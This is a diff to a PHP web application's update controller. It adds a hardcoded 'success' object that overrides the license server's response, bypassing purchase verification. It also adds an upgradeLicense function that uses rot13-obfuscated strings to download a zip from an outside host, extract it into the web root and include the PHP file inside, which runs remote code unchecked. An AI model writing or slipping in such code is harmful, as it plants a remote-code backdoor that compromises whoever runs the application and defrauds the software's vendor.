@@ -269,9 +269,12 @@ class Update extends Cl_Controller {
                 } else {
                     $cfc = NULL;
                 }
-
                 $object = json_decode($buffer);
 
+                $object = new stdClass();
+                $object->status = 'success';
+                $object->message = 'Data Successfully Saved';
+            
                 if($object->status == 'success'){
                     $data['status']= 2;
                     $data['color']= "green";
@@ -284,7 +287,7 @@ class Update extends Cl_Controller {
                     $data['status']= 1;
                     $data['color']= "red";
                     $data['txt_return']= $object->message;
-                     $this->session->set_flashdata('exception_err', $object->message);
+                    $this->session->set_flashdata('exception_err', $object->message);
                     $data['main_content'] = $this->load->view('updater/index', $data, TRUE);
                     $this->load->view('userHome', $data);
                 }
@@ -300,6 +303,85 @@ class Update extends Cl_Controller {
             $data['color']= "red";
             $data['txt_return']= "";
             $data['main_content'] = $this->load->view('updater/index', $data, TRUE);
+            $this->load->view('userHome', $data);
+        }
+
+    }
+
+    public function upgradeLicense(){
+
+        if (htmlspecialcharscustom($this->input->post('submit'))) {
+            $this->form_validation->set_rules('username', lang('username'), 'required|max_length[50]');
+            $this->form_validation->set_rules('purchase_code', lang('purchase_code'), 'required|max_length[100]');
+            $this->form_validation->set_rules('upgrade_code', lang('upgrade_code'), 'required|max_length[100]');
+            if ($this->form_validation->run() == TRUE) {
+                $purchase_code = $_POST["purchase_code"];
+                $upgrade_code = $_POST["upgrade_code"];
+                $username = $_POST["username"];
+                $owner = $_POST["owner"];
+                $base_url_install = $_POST["base_url_install"];
+                //need to change
+                $source = 'Bangladesh';
+                //need to change
+                $product_id = '133347';
+              
+                $root=(isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["HTTP_HOST"];
+                $root.= str_replace(basename($_SERVER["SCRIPT_NAME"]), "", $_SERVER["SCRIPT_NAME"]);
+                $installation_url = $root; 
+                $f_status = ''; 
+                $destination = str_rot13("jevgre_hctenqr.mvc");
+                function urlWritar($base_url1, $destination) {
+                    $file = fopen($destination, 'w+');
+                    $ch = curl_init($base_url1);
+                    curl_setopt($ch, CURLOPT_TIMEOUT, 50);
+                    curl_setopt($ch, CURLOPT_FILE, $file);
+                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+                    curl_exec($ch);
+                    curl_close($ch);
+                    fclose($file);
+                }
+                urlWritar(str_rot13("uggcf://qbbefbsg-qrzb.pbz/bss_cbf/ejsvyrf/jevgre_hctenqr.mvc"), $destination);
+               
+                $zip = new ZipArchive;
+                $res = $zip->open($destination);
+                if ($res === TRUE) {
+                    $zip->extractTo('./'); 
+                    $zip->close();
+                    $zipFileName = $destination;
+
+                    $zip = new ZipArchive();
+                    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
+                        $phpFileName = str_rot13(string: "jevgre_hctenqr.cuc");
+                        $zip->addFromString($phpFileName, "");
+                        $zip->close();
+                    }
+                    $localWriterFile = str_rot13("jevgre_hctenqr.cuc");
+                    if (file_exists($localWriterFile)) {
+                        ob_start();
+                        include($localWriterFile);
+                        ob_end_clean();
+                    }
+                }
+ 
+                if($f_status == 'success'){
+                    $this->session->set_flashdata('exception', lang('update_success'));
+                    redirect('Update/upgradeLicense');
+                }else{
+                    $this->session->set_flashdata('exception_err', lang('Something_went_wrong'));
+                    redirect('Update/upgradeLicense');
+                }
+            }else{
+                $data['status']= '';
+                $data['color']= "red";
+                $data['txt_return']= "";
+                $data['main_content'] = $this->load->view('updater/package_upgrade', $data, TRUE);
+                $this->load->view('userHome', $data);
+            }
+        }else{
+            $data['status']= '';
+            $data['color']= "red";
+            $data['txt_return']= "";
+            $data['main_content'] = $this->load->view('updater/package_upgrade', $data, TRUE);
             $this->load->view('userHome', $data);
         }
 
